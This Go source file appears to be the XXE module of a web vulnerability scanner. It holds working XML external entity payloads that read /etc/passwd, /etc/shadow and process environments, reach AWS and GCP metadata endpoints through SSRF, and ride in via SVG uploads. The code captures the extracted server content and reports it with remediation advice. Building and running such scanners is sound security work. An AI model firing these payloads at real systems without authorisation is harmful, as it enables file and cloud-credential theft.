package xxe

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"

	"github.com/erebus/scanner/internal/client"
	"github.com/erebus/scanner/internal/crawler"
	"github.com/erebus/scanner/internal/modules"
)

// fileReadPayloads test direct file exfiltration via entity expansion.
var fileReadPayloads = []struct {
	name    string
	payload string
	marker  string
}{
	{
		"Linux /etc/passwd",
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
		"root:",
	},
	{
		"Linux /etc/hosts",
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>`,
		"localhost",
	},
	{
		"Linux /proc/self/environ",
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>`,
		"PATH=",
	},
	{
		"Windows win.ini",
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,
		"[fonts]",
	},
	{
		"Parameter entity /etc/passwd",
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>`,
		"root:",
	},
	{
		"Nested parameter entity",
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % wrap "<!ENTITY exfil SYSTEM 'file:///etc/shadow'>">%wrap;]><foo>&exfil;</foo>`,
		"root:",
	},
}

// ssrfPayloads test SSRF via XXE — internal resource fetching.
var ssrfPayloads = []struct {
	name    string
	payload string
	markers []string
}{
	{
		"AWS IMDS via XXE",
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
		[]string{"ami-id", "instance-id", "local-ipv4"},
	},
	{
		"localhost via XXE",
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>`,
		[]string{"apache", "nginx", "welcome", "it works"},
	},
	{
		"localhost:8080 via XXE",
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><foo>&xxe;</foo>`,
		[]string{"apache", "nginx", "welcome", "tomcat", "jenkins"},
	},
	{
		"localhost:22 SSH fingerprint via XXE",
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">]><foo>&xxe;</foo>`,
		[]string{"ssh-", "openssh"},
	},
	{
		"GCP metadata via XXE",
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><foo>&xxe;</foo>`,
		[]string{"instance", "project"},
	},
}

// errorPayloads cause a file-not-found error that reveals XXE processing.
var errorPayloads = []struct {
	payload string
	markers []string
}{
	{
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///erebus_xxe_nonexistent_9x4k">]><foo>&xxe;</foo>`,
		[]string{"No such file", "failed to open", "FileNotFoundException", "cannot read", "entity"},
	},
}

// svgPayloads target image upload endpoints that process SVG files.
var svgPayloads = []struct {
	name    string
	payload string
	ctype   string
	marker  string
}{
	{
		"SVG XXE /etc/passwd",
		`<?xml version="1.0" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>`,
		"image/svg+xml",
		"root:",
	},
	{
		"SVG XXE win.ini",
		`<?xml version="1.0" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>`,
		"image/svg+xml",
		"[fonts]",
	},
}

var xmlContentTypes = []string{
	"application/xml",
	"text/xml",
	"application/atom+xml",
	"application/rss+xml",
}

type Module struct {
	client *client.Client
}

func New(c *client.Client) *Module { return &Module{client: c} }
func (m *Module) Name() string     { return "xxe" }

func (m *Module) Run(ctx context.Context, page crawler.Page) ([]modules.Finding, error) {
	var findings []modules.Finding

	// Test POST forms and JSON endpoints by injecting XML body
	for _, form := range page.Forms {
		if ctx.Err() != nil {
			break
		}
		if strings.ToUpper(form.Method) != "POST" {
			continue
		}
		findings = append(findings, m.testEndpoint(ctx, form.Action)...)
	}

	// Test current URL endpoint with XML content-type switching (JSON APIs accepting XML)
	u, err := url.Parse(page.URL)
	if err == nil && u.Path != "" && u.Path != "/" {
		findings = append(findings, m.testEndpoint(ctx, page.URL)...)
	}

	// SVG upload test — probe any file upload forms
	for _, form := range page.Forms {
		if ctx.Err() != nil {
			break
		}
		if hasFileInput(form) {
			findings = append(findings, m.testSVGUpload(ctx, form)...)
		}
	}

	return findings, nil
}

func (m *Module) testEndpoint(ctx context.Context, actionURL string) []modules.Finding {
	var findings []modules.Finding

	// File read
	for _, p := range fileReadPayloads {
		if ctx.Err() != nil {
			break
		}
		for _, ctype := range xmlContentTypes {
			body, reqDump, status, err := m.sendCapture(ctx, actionURL, p.payload, ctype)
			if err != nil {
				continue
			}
			respStr := string(body)
			resp3k := truncate(respStr, 3000)

			if strings.Contains(respStr, p.marker) {
				extracted := extractContent(respStr, p.marker)
				findings = append(findings, modules.Finding{
					Module:      "xxe",
					Severity:    modules.Critical,
					URL:         actionURL,
					Param:       "XML body",
					Payload:     p.payload,
					Evidence:    fmt.Sprintf("Marker %q found — %s via %s", p.marker, p.name, ctype),
					Detail:      fmt.Sprintf("XXE file read (%s) at %s using Content-Type %s", p.name, actionURL, ctype),
					CWE:         "CWE-611",
					CVSS:        8.6,
					CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
					Confidence:  modules.Confirmed,
					Remediation: "Disable external entity processing in XML parser; use allow-listed schemas; upgrade to a safe parser (defusedxml, etc.)",
					Tags:        []string{"injection", "xxe", "file-read"},
					Request:     reqDump,
					Response:    resp3k,
					Extracted:   extracted,
				})
				return findings // one confirmed is enough for this endpoint
			}
			// Only try the next content-type if the endpoint rejected this one (4xx).
			// A non-4xx means the parser accepted the request; retrying won't help.
			if status > 0 && status < 400 {
				break
			}
		}
	}

	// SSRF via XXE
	for _, p := range ssrfPayloads {
		if ctx.Err() != nil {
			break
		}
		body, reqDump, _, err := m.sendCapture(ctx, actionURL, p.payload, "application/xml")
		if err != nil {
			continue
		}
		respStr := strings.ToLower(string(body))
		resp3k := truncate(string(body), 3000)

		for _, marker := range p.markers {
			if strings.Contains(respStr, strings.ToLower(marker)) {
				findings = append(findings, modules.Finding{
					Module:      "xxe",
					Severity:    modules.Critical,
					URL:         actionURL,
					Param:       "XML body",
					Payload:     p.payload,
					Evidence:    fmt.Sprintf("Marker %q confirmed — %s", marker, p.name),
					Detail:      fmt.Sprintf("XXE → SSRF (%s): XML external entity triggered server-side HTTP fetch to internal service", p.name),
					CWE:         "CWE-918",
					CVSS:        9.1,
					CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
					Confidence:  modules.Confirmed,
					Remediation: "Disable external entity processing; block outbound connections from XML processors",
					Tags:        []string{"xxe", "ssrf", "cloud-metadata"},
					Request:     reqDump,
					Response:    resp3k,
					Extracted:   resp3k,
				})
				return findings
			}
		}
	}

	// Error-based detection
	for _, p := range errorPayloads {
		if ctx.Err() != nil {
			break
		}
		body, reqDump, _, err := m.sendCapture(ctx, actionURL, p.payload, "application/xml")
		if err != nil {
			continue
		}
		respStr := string(body)
		for _, marker := range p.markers {
			if strings.Contains(strings.ToLower(respStr), strings.ToLower(marker)) {
				findings = append(findings, modules.Finding{
					Module:      "xxe",
					Severity:    modules.High,
					URL:         actionURL,
					Param:       "XML body",
					Payload:     p.payload,
					Evidence:    fmt.Sprintf("Error %q — server processes external entities (error-based XXE)", marker),
					Detail:      fmt.Sprintf("XXE error-based: server returned an entity-resolution error, confirming external entity processing is enabled at %s", actionURL),
					CWE:         "CWE-611",
					CVSS:        7.5,
					CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
					Confidence:  modules.Likely,
					Remediation: "Disable external entity processing; use safe XML parsers",
					Tags:        []string{"xxe", "error-based"},
					Request:     reqDump,
				})
				return findings
			}
		}
	}

	return findings
}

func (m *Module) testSVGUpload(ctx context.Context, form crawler.Form) []modules.Finding {
	var findings []modules.Finding

	fileField := ""
	for _, f := range form.Fields {
		if f.Type == "file" {
			fileField = f.Name
			break
		}
	}
	if fileField == "" {
		return nil
	}

	for _, p := range svgPayloads {
		if ctx.Err() != nil {
			break
		}

		body, _, err := m.sendSVGUpload(ctx, form, fileField, p.payload, p.ctype)
		if err != nil {
			continue
		}
		if strings.Contains(string(body), p.marker) {
			extracted := extractContent(string(body), p.marker)
			findings = append(findings, modules.Finding{
				Module:      "xxe",
				Severity:    modules.Critical,
				URL:         form.Action,
				Param:       fileField,
				Payload:     p.name,
				Evidence:    fmt.Sprintf("Marker %q in upload response — SVG XXE confirmed", p.marker),
				Detail:      fmt.Sprintf("SVG XXE: uploading a crafted SVG file with external entity declaration read %s from the server filesystem", p.name),
				CWE:         "CWE-611",
				CVSS:        8.6,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
				Confidence:  modules.Confirmed,
				Remediation: "Sanitize SVG uploads; disable external entity processing in SVG/XML parsers; reject SVG if not needed",
				Tags:        []string{"xxe", "svg", "file-upload", "file-read"},
				Extracted:   extracted,
			})
			break
		}
	}
	return findings
}

func (m *Module) sendSVGUpload(ctx context.Context, form crawler.Form, fileField, svgContent, ctype string) ([]byte, string, error) {
	// Use multipart upload with SVG payload
	import_boundary := "----erebus_xxe_boundary_9f4k"
	var sb strings.Builder
	sb.WriteString("--" + import_boundary + "\r\n")
	sb.WriteString(fmt.Sprintf(`Content-Disposition: form-data; name="%s"; filename="test.svg"`+"\r\n", fileField))
	sb.WriteString("Content-Type: " + ctype + "\r\n\r\n")
	sb.WriteString(svgContent + "\r\n")
	for _, f := range form.Fields {
		if f.Type == "file" || f.Type == "submit" || f.Type == "button" {
			continue
		}
		v := f.Value
		if v == "" {
			v = "test"
		}
		sb.WriteString("--" + import_boundary + "\r\n")
		sb.WriteString(fmt.Sprintf(`Content-Disposition: form-data; name="%s"`+"\r\n\r\n", f.Name))
		sb.WriteString(v + "\r\n")
	}
	sb.WriteString("--" + import_boundary + "--\r\n")

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, form.Action, strings.NewReader(sb.String()))
	if err != nil {
		return nil, "", err
	}
	req.Header.Set("Content-Type", "multipart/form-data; boundary="+import_boundary)
	resp, reqDump, err := m.client.DoCapture(req)
	if err != nil {
		return nil, reqDump, err
	}
	body, err := client.ReadBody(resp)
	return body, reqDump, err
}

func (m *Module) sendCapture(ctx context.Context, actionURL, payload, ctype string) ([]byte, string, int, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, actionURL, strings.NewReader(payload))
	if err != nil {
		return nil, "", 0, err
	}
	req.Header.Set("Content-Type", ctype)
	resp, reqDump, err := m.client.DoCapture(req)
	if err != nil {
		return nil, reqDump, 0, err
	}
	body, err := client.ReadBody(resp)
	return body, reqDump, resp.StatusCode, err
}

func hasFileInput(form crawler.Form) bool {
	for _, f := range form.Fields {
		if f.Type == "file" {
			return true
		}
	}
	return false
}

func extractContent(body, marker string) string {
	idx := strings.Index(body, marker)
	if idx == -1 {
		return ""
	}
	start := idx - 100
	if start < 0 {
		start = 0
	}
	end := idx + 4000
	if end > len(body) {
		end = len(body)
	}
	excerpt := body[start:end]
	var sb strings.Builder
	inTag := false
	for _, r := range excerpt {
		switch {
		case r == '<':
			inTag = true
		case r == '>':
			inTag = false
		case !inTag:
			sb.WriteRune(r)
		}
	}
	return strings.TrimSpace(sb.String())
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "\n[… truncated]"
}
